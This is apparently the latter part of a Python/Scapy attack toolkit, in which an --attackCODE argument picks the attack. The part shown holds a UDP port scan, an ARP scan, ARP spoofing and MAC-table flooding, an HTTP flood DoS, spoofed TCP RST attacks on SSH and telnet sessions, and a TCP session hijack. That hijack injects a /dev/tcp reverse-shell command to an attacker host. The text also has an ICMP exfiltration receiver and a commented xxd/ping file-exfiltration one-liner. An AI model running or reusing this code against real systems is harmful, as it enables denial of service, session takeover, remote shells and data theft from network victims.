    # The client sends a UDP packet and the port number it wants to connect to, but the server responds with an ICMP port unreachable error type 3 and code 3, meaning that the port is CLOSED on the server.
    # If the server responds to the client with an ICMP error type 3 and code 1, 2, 9, 10, or 13, then that port on the server is FILTERED.
    # If the server sends no response to the client’s UDP request packet for that port, it can be concluded that the port on the server is either OPEEN or FILTERED. No final state of the port can be decided.
if args.attackCODE == 15:
    print("UDP Scan\n")

    print("Destination IP: " + args.dstIP)
    print("Start port: " + str(args.pSCAN[0]))
    print("End port: " + str(args.pSCAN[1]))
    print("Sleep time: " + str(args.sleep))

    try:
        for destPORT in range(int(args.pSCAN[0]), int(args.pSCAN[1]) + 1):
            print("Port: " + str(destPORT))
            responses = []
            for count in range(0,3):
                packet = IP(dst=args.dstIP) / UDP(dport=destPORT)
                responses.append(sr1(packet, timeout = 1, verbose = 0))
            if all(response == None for response in responses):
                print("Port " + str(destPORT) + " Open|Filtered")
            for response in responses:
                if response != None:
                    if response.haslayer(UDP):
                        print("Port " + str(destPORT) + " Open!")
                        break
                    elif response.haslayer(ICMP):
                        if int(response.getlayer(ICMP).type) == 3 and int(response.getlayer(ICMP).code) == 3: # ICMP port unreachable error type 3 and code 3 --> closed
                            # print("Port " + str(destPORT) + " Closed!")
                            break
                        elif int(response.getlayer(ICMP).type) == 3 and int(response.getlayer(ICMP).code) in [1,2,9,10,13]: # ICMP error type 3 and code 1, 2, 9, 10, or 13 --> filtered.
                            print("Port " + str(destPORT) + " Filtered!")    
                            break
                    else:
                        print("CHECK port " + str(destPORT) + "!") # no response --> open or filtered. No final state of the port can be decided.  
            time.sleep(args.sleep)               
    except Exception as e:
        print(e)

# 16: ARP Scan #
    # --dstIP: An IP address or IP address range to scan. For example:
        # - 192.168.1.1 to scan a single IP address
        # - 192.168.1.1/24 to scan a range of IP addresses.
    # Performs a network scan by sending ARP requests to an IP address or a range of IP addresses.
if args.attackCODE == 16:
    print("ARP Scan\n")

    print("Destination IP: " + args.dstIP)
    try:
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=args.dstIP)
        ans, unans = response = srp(packet, timeout = 1, verbose = 0)
        result = []
        for sent, received in ans:
            result.append({'IP': received.psrc, 'MAC': received.hwsrc})
        parsed_json = json.loads(str(result).replace("'", "\"").replace("None", "\"\""))
        indent_json = json.dumps(parsed_json, indent=4, sort_keys=True)
        print(indent_json)           
    except Exception as e:
        print(e)

# 17: ARP spoofing RANDOM IP AND MAC
    # --victimIP
    # [--victimMAC]
    # --interface
    # --numPCK   
     
    # Sending a flood of IP packets with random IP and MAC addresses in order to overload the target MAC table
if args.attackCODE == 17:
    print("ARP spoofing RANDOM ~ SCAPY\n")  
    try:
        victimMAC = args.victimMAC
        if args.victimMAC == None:
            # try to recover victimMAC
            resp_target, unans_target = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=args.victimIP), retry=2, timeout=7, iface=args.interface, verbose=0)
            print("Founded MAC victimIP: " + args.victimIP + " : " + resp_target[0][1][ARP].hwsrc)
            victimMAC = str(resp_target[0][1][ARP].hwsrc)
        else:
            print("Provided MAC victimIP: " + args.victimIP + " : " +args.victimMAC)

        if victimMAC != None:
            packet_list = []
            for i in range(args.numPCK):
                srcRandomMAC = RandMAC()
                srcRandomIP = RandIP()
                packet = Ether(src=srcRandomMAC, dst=victimMAC) / ARP(op=2, hwsrc=srcRandomMAC, psrc=srcRandomIP, hwdst=victimMAC, pdst=args.victimIP)
                packet_list.append(packet)
            sendp(packet_list, iface=args.interface)
        else:
            print("Provide --victimMAC --victimIP")
    except Exception as e:    
        print(e)

# 18: HTTP Flood ~ DoS
    # --url
    # --numPCK   
     
    # Sending a flood of HTTP GET request
if args.attackCODE == 18:
    print("HTTP Flood ~ DoS\n")
    try:
        for i in range(args.numPCK):
            http_request(host=args.url, path="/", port=80, display=False, verbose=0) #if display=True it open our browser
    except Exception as e:    
        print(e)

# 19: SSH reset
    # --host1
    # --host2 
    # --dstPORT (22)
    # --interface
     
    # The TCP RST Attack can terminate an established TCP connection between two victims. For example, if
    # there is an established ssh connection (TCP) between two users A and B, attackers can spoof a RST
    # packet from A to B, breaking this existing connection. To succeed in this attack, attackers need to correctly
    # construct the TCP RST packet.

    # Scapy allow us to sniff and construct the correct packet.
if args.attackCODE == 19:
    print("SSH reset\n")
    def do_rst(pkt):
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags=0x14, seq=pkt[TCP].ack, ack=pkt[TCP].seq+1) # 0x14 = 20 --> RST/ACK
        pkt = ip/tcp
        # ls(pkt)
        send(pkt,verbose=0)
    sniff(iface=args.interface,filter='host ' + args.host1 + ' and host ' + args.host2 + ' and port ' + str(args.dstPORT), prn=do_rst)

# 20: telnet reset
    # --host1
    # --host2 
    # --dstPORT (23)
    # --interface
    
    # The TCP RST Attack can terminate an established TCP connection between two victims. For example, if
    # there is an established telnet connection (TCP) between two users A and B, attackers can spoof a RST
    # packet from A to B, breaking this existing connection. To succeed in this attack, attackers need to correctly
    # construct the TCP RST packet.

    # Scapy allow us to sniff and construct the corect packet.
if args.attackCODE == 20:
    print("telnet reset\n")
    def do_rst(pkt):
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, 
        flags=0x14, seq=pkt[TCP].ack, ack=pkt[TCP].seq+1) # 0x14 = 20 --> RST/ACK
        pkt = ip/tcp
        # ls(pkt)
        send(pkt,verbose=0)
    sniff(iface=args.interface, filter='host ' + args.host1 + ' and host ' + args.host2 + ' and port ' + str(args.dstPORT), prn=do_rst)

# 21: TCP Session Hijacking Reverse Shell
    # --interface
    # --dstPORT (23 telnet)
  
    # attacker 192.168.10.68
        # sudo python3 script.py --attackCODE 21 --interface eth0.30 --dstPORT 23
        # nc -lp 9090 -vn
    # client
        # telnet 192.168.10.67
    # victim Ubuntu12.04 192.168.10.67

if args.attackCODE == 21:
    print("TCP Session Hijacking Reverse Shell")
    # remove duplication
    # {"dest ip":times}
    dest_record = {}

    def do_hijack(pkt):
        print(pkt[IP].dst)
        key = pkt[IP].dst
        if key not in dest_record:     # freshman
            dest_record[key] = 0
            return
        else:
            if dest_record[key] < 0:   # prior victim
                return
            if dest_record[key] <= 50: # wait for logging
                dest_record[key] += 1
                print(dest_record[key])
                return
            if 4*pkt[IP].ihl+4*pkt[TCP].dataofs != pkt[IP].len:  # exist content
                # IP PACKET
                    # Internet Header Length (IHL)
                    # The IPv4 header is variable in size due to the optional 14th field (options). 
                    # The IHL field contains the size of the IPv4 header, it has 4 bits that specify the number of 32-bit words in the header. 
                    # The minimum value for this field is 5,[34] which indicates a length of 5 × 32 bits = 160 bits = 20 bytes. As a 4-bit field, 
                    # the maximum value is 15, this means that the maximum size of the IPv4 header is 15 × 32 bits = 480 bits = 60 bytes.

                # TCP packet
                    # dataofs data off set
                print(pkt[IP].ihl, pkt[TCP].dataofs, pkt[IP].len)
                return
            else:
                dest_record[key] = -1   # attack

        ip = IP(id=pkt[IP].id+1, src=pkt[IP].src, dst=pkt[IP].dst)
        tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=0x18)
        raw = Raw(load='\r\n/bin/bash -i  > /dev/tcp/192.168.10.68/9090 0<&1 2>&1\r\n')
        pkt = ip/tcp/raw
        # ls(pkt)
        send(pkt, verbose=0)
        print('attacked', key)

    sniff(iface=args.interface, filter='dst port ' + str(args.dstPORT), prn=do_hijack)

# 22: sniffer ICMP exfiltration
    # --interface

    # #In order to exfiltrate the content of a file via pings you can do:
    # xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
    # This will 4bytes per ping packet (you could probably increase this until 16)
if args.attackCODE == 22:
    print("sniffer ICMP exfiltration\n")
    #This is ippsec receiver created in the HTB machine Mischief
    def process_packet(pkt):
        if pkt.haslayer(ICMP):
            if pkt[ICMP].type == 0:
                data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
                print(f"{data.decode('utf-8')}", flush=True, end="")

    sniff(iface=args.interface, prn=process_packet)

if args.attackCODE == None:
    parser.print_help()
    print("ERROR: No attack selcted! choose one using --attackCODE")

exit()
